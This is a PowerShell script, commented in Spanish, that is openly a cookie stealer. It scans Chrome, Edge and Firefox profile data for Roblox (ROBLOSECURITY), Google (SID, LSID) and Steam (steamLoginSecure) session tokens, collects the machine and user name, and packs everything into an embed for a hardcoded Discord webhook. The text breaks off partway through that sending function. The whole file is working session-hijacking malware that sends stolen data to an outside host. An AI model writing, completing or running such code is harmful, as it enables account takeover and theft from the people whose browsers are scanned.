# Script optimizado para capturar cookies específicas de Roblox, Gmail y Steam
function Get-SpecificCookies {
    $cookies = @{}
    
    # Chrome - método directo sin SQLite
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    if (Test-Path $chromePath) {
        try {
            # Acceder directamente a cookies de Chrome
            $chromeCookies = @()
            
            # Roblox
            $robloxPath = "$chromePath\Local Storage\leveldb"
            if (Test-Path $robloxPath) {
                $robloxData = Get-ChildItem $robloxPath -Filter "*.ldb" | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw
                    if ($content -match "ROBLOSECURITY") {
                        $content -match 'ROBLOSECURITY"?\s*[:=]?\s*"([^"]+)"' | Out-Null
                        if ($Matches[1]) {
                            $chromeCookies += @{Name="ROBLOSECURITY"; Value=$Matches[1]; Domain="roblox.com"}
                        }
                    }
                }
            }
            
            # Gmail/Google
            $googlePath = "$chromePath\Local Storage\leveldb"
            if (Test-Path $googlePath) {
                $googleData = Get-ChildItem $googlePath -Filter "*.ldb" | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw
                    if ($content -match "SID=") {
                        $content -match 'SID=([^;]+)' | Out-Null
                        if ($Matches[1]) {
                            $chromeCookies += @{Name="SID"; Value=$Matches[1]; Domain="accounts.google.com"}
                        }
                    }
                    if ($content -match "LSID=") {
                        $content -match 'LSID=([^;]+)' | Out-Null
                        if ($Matches[1]) {
                            $chromeCookies += @{Name="LSID"; Value=$Matches[1]; Domain="accounts.google.com"}
                        }
                    }
                }
            }
            
            # Steam
            $steamPath = "$chromePath\Local Storage\leveldb"
            if (Test-Path $steamPath) {
                $steamData = Get-ChildItem $steamPath -Filter "*.ldb" | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw
                    if ($content -match "steamLoginSecure") {
                        $content -match 'steamLoginSecure"?\s*[:=]?\s*"([^"]+)"' | Out-Null
                        if ($Matches[1]) {
                            $chromeCookies += @{Name="steamLoginSecure"; Value=$Matches[1]; Domain="steamcommunity.com"}
                        }
                    }
                }
            }
            
            $cookies.Chrome = $chromeCookies
        } catch {
            $cookies.Chrome = "Error: $_"
        }
    }
    
    # Firefox - método directo
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        try {
            $profiles = Get-ChildItem $firefoxPath -Directory
            $ffCookies = @()
            
            foreach ($profile in $profiles) {
                $cookiesPath = "$($profile.FullName)\cookies.sqlite"
                if (Test-Path $cookiesPath) {
                    # Extraer cookies específicas sin SQLite
                    $tempPath = "$env:TEMP\ff_cookies_$($profile.Name).db"
                    Copy-Item $cookiesPath $tempPath -Force
                    
                    # Buscar cookies específicas con strings
                    $content = Get-Content $tempPath -Raw -ErrorAction SilentlyContinue
                    
                    # Roblox
                    if ($content -match "ROBLOSECURITY") {
                        $content -match 'ROBLOSECURITY"?\s*[:=]?\s*"([^"]+)"' | Out-Null
                        if ($Matches[1]) {
                            $ffCookies += @{Name="ROBLOSECURITY"; Value=$Matches[1]; Domain="roblox.com"}
                        }
                    }
                    
                    # Gmail/Google
                    if ($content -match "SID=") {
                        $content -match 'SID=([^;]+)' | Out-Null
                        if ($Matches[1]) {
                            $ffCookies += @{Name="SID"; Value=$Matches[1]; Domain="accounts.google.com"}
                        }
                    }
                    
                    # Steam
                    if ($content -match "steamLoginSecure") {
                        $content -match 'steamLoginSecure"?\s*[:=]?\s*"([^"]+)"' | Out-Null
                        if ($Matches[1]) {
                            $ffCookies += @{Name="steamLoginSecure"; Value=$Matches[1]; Domain="steamcommunity.com"}
                        }
                    }
                    
                    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
                }
            }
            
            $cookies.Firefox = $ffCookies
        } catch {
            $cookies.Firefox = "Error: $_"
        }
    }
    
    # Edge - método directo
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
    if (Test-Path $edgePath) {
        try {
            $edgeCookies = @()
            
            # Roblox
            $robloxPath = "$edgePath\Local Storage\leveldb"
            if (Test-Path $robloxPath) {
                $robloxData = Get-ChildItem $robloxPath -Filter "*.ldb" | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw
                    if ($content -match "ROBLOSECURITY") {
                        $content -match 'ROBLOSECURITY"?\s*[:=]?\s*"([^"]+)"' | Out-Null
                        if ($Matches[1]) {
                            $edgeCookies += @{Name="ROBLOSECURITY"; Value=$Matches[1]; Domain="roblox.com"}
                        }
                    }
                }
            }
            
            # Gmail/Google
            $googlePath = "$edgePath\Local Storage\leveldb"
            if (Test-Path $googlePath) {
                $googleData = Get-ChildItem $googlePath -Filter "*.ldb" | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw
                    if ($content -match "SID=") {
                        $content -match 'SID=([^;]+)' | Out-Null
                        if ($Matches[1]) {
                            $edgeCookies += @{Name="SID"; Value=$Matches[1]; Domain="accounts.google.com"}
                        }
                    }
                }
            }
            
            # Steam
            $steamPath = "$edgePath\Local Storage\leveldb"
            if (Test-Path $steamPath) {
                $steamData = Get-ChildItem $steamPath -Filter "*.ldb" | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw
                    if ($content -match "steamLoginSecure") {
                        $content -match 'steamLoginSecure"?\s*[:=]?\s*"([^"]+)"' | Out-Null
                        if ($Matches[1]) {
                            $edgeCookies += @{Name="steamLoginSecure"; Value=$Matches[1]; Domain="steamcommunity.com"}
                        }
                    }
                }
            }
            
            $cookies.Edge = $edgeCookies
        } catch {
            $cookies.Edge = "Error: $_"
        }
    }
    
    return $cookies
}

# Enviar a Discord
function Send-ToDiscord {
    $webhookUrl = "https://discord.com/api/webhooks/1497374871968153770/BtRuWZtG9bPSShyYAM3wt29wGg8Rm-vTSfyOHLfO5M9dOF6HgYgO6Xs83rd2xPpwzaqT"
    
    $cookies = Get-SpecificCookies
    $systemInfo = @{
        ComputerName = $env:COMPUTERNAME
        Username = $env:USERNAME
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
    
    $embed = @{
        title = "Cookies Específicas Capturadas"
        color = 16711680
        fields = @()
        footer = @{
            text = "Capturado el $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        }
    }
    
    $embed.fields += @{
        name = "Sistema"
        value = "PC: $($systemInfo.ComputerName)`nUser: $($systemInfo.Username)"
        inline = $false
    }
    
    foreach ($browser in $cookies.Keys) {
        if ($cookies[$browser] -is [string]) {
            $embed.fields += @{
                name = "$browser"
                value = $cookies[$browser]
                inline = $false
            }
        } elseif ($cookies[$browser] -and $cookies[$browser].Count -gt 0) {
            $cookieText = ($cookies[$browser] | ForEach-Object { "$($_.Name)=$($_.Value) [Domain: $($_.Domain)]" }) -join "`n"
            
            $embed.fields += @{
                name = "$browser - Cookies Específicas"
                value = "````$cookieText````"
                inline = \$false
            }
        } else {
            \$embed.fields += @{
                name = "\$browser - Cookies Específicas"
               